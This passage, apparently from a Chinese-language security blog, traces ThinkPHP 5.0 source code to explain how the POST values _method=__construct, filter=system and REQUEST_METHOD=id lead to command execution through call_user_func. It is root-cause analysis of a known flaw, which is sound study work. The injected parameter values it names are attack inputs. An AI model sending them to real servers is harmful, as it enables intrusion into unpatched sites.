<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params"><span class="variable">$request</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$path</span>   = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">path</span>();</span><br><span class="line">    <span class="variable">$depr</span>   = <span class="variable">$config</span>[<span class="string">&#x27;pathinfo_depr&#x27;</span>];</span><br><span class="line">    <span class="variable">$result</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 路由检测</span></span><br><span class="line">    <span class="variable">$check</span> = !<span class="title function_ invoke__">is_null</span>(<span class="built_in">self</span>::<span class="variable">$routeCheck</span>) ? <span class="built_in">self</span>::<span class="variable">$routeCheck</span> : <span class="variable">$config</span>[<span class="string">&#x27;url_route_on&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check</span>) &#123;</span><br><span class="line">        <span class="comment">// 开启路由</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(RUNTIME_PATH . <span class="string">&#x27;route.php&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 读取路由缓存</span></span><br><span class="line">            <span class="variable">$rules</span> = <span class="keyword">include</span> RUNTIME_PATH . <span class="string">&#x27;route.php&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">is_array</span>(<span class="variable">$rules</span>) &amp;&amp; <span class="title class_">Route</span>::<span class="title function_ invoke__">rules</span>(<span class="variable">$rules</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$files</span> = <span class="variable">$config</span>[<span class="string">&#x27;route_config_file&#x27;</span>];</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(CONF_PATH . <span class="variable">$file</span> . CONF_EXT)) &#123;</span><br><span class="line">                    <span class="comment">// 导入路由配置</span></span><br><span class="line">                    <span class="variable">$rules</span> = <span class="keyword">include</span> CONF_PATH . <span class="variable">$file</span> . CONF_EXT;</span><br><span class="line">                    <span class="title function_ invoke__">is_array</span>(<span class="variable">$rules</span>) &amp;&amp; <span class="title class_">Route</span>::<span class="title function_ invoke__">import</span>(<span class="variable">$rules</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>路由缓存暂无，因此读取路由配置文件<strong>public/../application/route.php</strong>，并根据配置注册路由。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;__pattern__&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;\w+&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&#x27;[hello]&#x27;</span>     =&gt; [</span><br><span class="line">        <span class="string">&#x27;:id&#x27;</span>   =&gt; [<span class="string">&#x27;index/hello&#x27;</span>, [<span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;get&#x27;</span>], [<span class="string">&#x27;id&#x27;</span> =&gt; <span class="string">&#x27;\d+&#x27;</span>]],</span><br><span class="line">        <span class="string">&#x27;:name&#x27;</span> =&gt; [<span class="string">&#x27;index/hello&#x27;</span>, [<span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;post&#x27;</span>]],</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<p>然后又回到了<strong>routeCheck</strong>方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params"><span class="variable">$request</span>, <span class="keyword">array</span> <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title class_">Route</span>::<span class="title function_ invoke__">check</span>(<span class="variable">$request</span>, <span class="variable">$path</span>, <span class="variable">$depr</span>, <span class="variable">$config</span>[<span class="string">&#x27;url_domain_deploy&#x27;</span>]);</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后来到<strong>Route::check</strong>方法，前面一堆检查缓存和检查路由别名的操作，然后解析<strong>$request-&gt;method()</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$request</span>, <span class="variable">$url</span>, <span class="variable">$depr</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$checkDomain</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="variable">$method</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">method</span>());</span><br></pre></td></tr></table></figure>
<p>跟进<strong>method</strong>方法，<strong>var_method</strong>初始为<strong>_method</strong>，即当<strong>POST</strong>存在<strong>_method</strong>参数的时候，将传入的值赋给<strong>$this-&gt;method</strong>。</p>
<p>因此<strong>POC</strong>中传入的<strong>_method=__construct</strong>在这里发挥作用，赋值<strong>__construct</strong>给<strong>$this-&gt;method</strong>，然后在下一步被动态调用，指向了<strong>$this-&gt;__construct</strong>，并将<strong>POST</strong>数组作为<strong>option</strong>传入。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span>(<span class="params"><span class="variable">$method</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取原始请求类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="variable language_">$this</span>-&gt;method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;var_method&#x27;</span>)])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;method = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_POST</span>[<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;var_method&#x27;</span>)]);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;method&#125;(<span class="variable">$_POST</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;method = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;method = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进<strong>__construct</strong>方法，可以看到<strong>property_exists</strong>方法校验<strong>$option</strong>的键值对，当存在属于<strong>Request</strong>类的成员变量名的时候，可以对成员变量的值进行覆盖，因此构造传入的<strong>filter</strong>和<strong>method</strong>都成功覆盖了变量，使得<strong>$this-&gt;filter[]=system</strong>，<strong>$this-&gt;method=get</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$options</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$item</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;filter)) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;default_filter&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存 php://input</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;input = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着一系列操作返回<strong>run</strong>方法，此时<strong>$dispatch</strong>的值如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dispatch</span> = &#123;<span class="keyword">array</span>&#125; [<span class="number">3</span>]</span><br><span class="line"> type = <span class="string">&quot;method&quot;</span></span><br><span class="line"> method = &#123;<span class="keyword">array</span>&#125; [<span class="number">2</span>]</span><br><span class="line">  <span class="number">0</span> = <span class="string">&quot;\think\captcha\CaptchaController&quot;</span></span><br><span class="line">  <span class="number">1</span> = <span class="string">&quot;index&quot;</span></span><br><span class="line"> <span class="keyword">var</span> = &#123;<span class="keyword">array</span>&#125; [<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p>接下来，如果没开<strong>debug</strong>，会进入<strong>exec</strong>方法，如果开启<strong>debug</strong>，就会进入<strong>Log</strong>操作。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">Request <span class="variable">$request</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 记录路由和请求信息</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$debug</span>) &#123;</span><br><span class="line">        <span class="title class_">Log</span>::<span class="title function_ invoke__">record</span>(<span class="string">&#x27;[ ROUTE ] &#x27;</span> . <span class="title function_ invoke__">var_export</span>(<span class="variable">$dispatch</span>, <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">        <span class="title class_">Log</span>::<span class="title function_ invoke__">record</span>(<span class="string">&#x27;[ HEADER ] &#x27;</span> . <span class="title function_ invoke__">var_export</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">        <span class="title class_">Log</span>::<span class="title function_ invoke__">record</span>(<span class="string">&#x27;[ PARAM ] &#x27;</span> . <span class="title function_ invoke__">var_export</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">param</span>(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听 app_begin</span></span><br><span class="line">    <span class="title class_">Hook</span>::<span class="title function_ invoke__">listen</span>(<span class="string">&#x27;app_begin&#x27;</span>, <span class="variable">$dispatch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 请求缓存检查</span></span><br><span class="line">    <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cache</span>(</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&#x27;request_cache&#x27;</span>],</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&#x27;request_cache_expire&#x27;</span>],</span><br><span class="line">        <span class="variable">$config</span>[<span class="string">&#x27;request_cache_except&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">exec</span>(<span class="variable">$dispatch</span>, <span class="variable">$config</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="没开debug">没开debug</h4>
<p>跟进<strong>exec</strong>方法，由于<strong>$dispatch['type']</strong>的值为<strong>method</strong>，因此进入<strong>case
'method'</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$dispatch</span>, <span class="variable">$config</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$dispatch</span>[<span class="string">&#x27;type&#x27;</span>]) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;method&#x27;</span>: <span class="comment">// 回调方法</span></span><br><span class="line">            <span class="variable">$vars</span> = <span class="title function_ invoke__">array_merge</span>(<span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">param</span>(), <span class="variable">$dispatch</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">            <span class="variable">$data</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">invokeMethod</span>(<span class="variable">$dispatch</span>[<span class="string">&#x27;method&#x27;</span>], <span class="variable">$vars</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进<strong>param</strong>方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;mergeParam)) &#123;</span><br><span class="line">        <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line">    	<span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取<strong>$method</strong>的值，跟进<strong>method</strong>方法，带进的参数为<strong>true</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span>(<span class="params"><span class="variable">$method</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取原始请求类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="variable language_">$this</span>-&gt;method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;var_method&#x27;</span>)])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;method = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_POST</span>[<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;var_method&#x27;</span>)]);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;method&#125;(<span class="variable">$_POST</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;method = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;method = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传入的是<strong>true</strong>，继续跟进<strong>server</strong>方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;server)) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;server = <span class="variable">$_SERVER</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;server = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;server, <span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;server, <span class="literal">false</span> === <span class="variable">$name</span> ? <span class="literal">false</span> : <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$name</span>), <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>非空非数组，直接<strong>return</strong>，跟进<strong>input</strong>方法。</p>
<p>此时后面传入的<strong>$data</strong>为<strong>REQUEST_METHOD=id</strong>，<strong>$name</strong>为<strong>REQUEST_METHOD</strong>，<strong>$default</strong>为<strong>null</strong>，<strong>$filter</strong>为空字符串。</p>
<p>前面解析<strong>$name</strong>到<strong>$type</strong>赋值为<strong>s</strong>，到下面的<strong>for</strong>循环直接将<strong>$data</strong>赋值为<strong>id</strong>，然后开始解析过滤器。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// 解析name</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$type</span> = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 按.拆分成多维数组进行判断</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>) <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$val</span>])) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="variable">$data</span>[<span class="variable">$val</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 无输入数据，返回默认值</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>$filter</strong>和<strong>$default</strong>两个为空值，直接将之前类中覆盖的<strong>$this-&gt;filter</strong>传给局部变量的<strong>$filter</strong>，并返回，此时值为<strong>{"system",
null}[2]</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$filter</span>, <span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">        <span class="variable">$filter</span> = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="variable language_">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$filter</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$filter</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$filter</span> = (<span class="keyword">array</span>) <span class="variable">$filter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filter</span>[] = <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>返回<strong>input</strong>方法后，由于<strong>data</strong>是字符串不是数组，因此跟进<strong>filterValue</strong>方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">        <span class="title function_ invoke__">reset</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>$value</strong>值为<strong>id</strong>，<strong>$key</strong>是<strong>REQUEST_METHOD</strong>，<strong>$filter</strong>是带有<strong>system</strong>字符串的数组。</p>
<p>接着<strong>array_pop</strong>方法将<strong>null</strong>弹出，剩一个<strong>system</strong>在数组中，<strong>for</strong>循环判断<strong>system</strong>为回调函数，调用<strong>call_user_func</strong>直接命令执行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$filters</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterExp</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后将执行的结果通过<strong>filterExp</strong>过滤后带回，默认过滤的是<strong>sql</strong>注入。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterExp</span>(<span class="params">&amp;<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOT EXISTS|NOTEXISTS|EXISTS|NOT NULL|NOTNULL|NULL|BETWEEN TIME|NOT BETWEEN TIME|NOTBETWEEN TIME|NOTIN|NOT IN|IN)$/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> .= <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TODO 其他安全过滤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就是一路将命令执行的结果带回，导致后面的<strong>switch
case</strong>直接进入<strong>default
case</strong>，再往后的数据带回暂且不提，调用栈如下。</p>
